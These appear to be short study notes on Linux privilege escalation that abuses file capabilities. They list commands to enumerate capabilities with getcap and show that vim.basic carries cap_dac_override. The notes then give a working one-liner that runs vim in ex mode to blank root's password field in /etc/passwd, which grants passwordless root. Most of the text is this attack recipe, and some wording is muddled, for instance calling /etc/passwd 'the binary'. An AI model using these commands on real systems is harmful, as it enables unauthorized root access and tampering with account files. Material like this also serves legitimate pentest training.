- Exploiting capabilities - Enumerating capabilities is the first step:
	- find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
- From results, you can enumerate even further to see if eip is ran
	- getcap /usr/bin/vim.basic
		- cap_dac_override=eip can allow us to abuse
- cat /etc/passwd | head -n1 is world wide readable
	- /usr/bin/vim.basic /etc/passwd will allow us to see all users from a capability shell

- Using the /etc/passwd line, we can make changes to the binary
	- ```shell-session
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
		- cat /etc/passwd | head -n1 will showcase the x missing in the binary execution

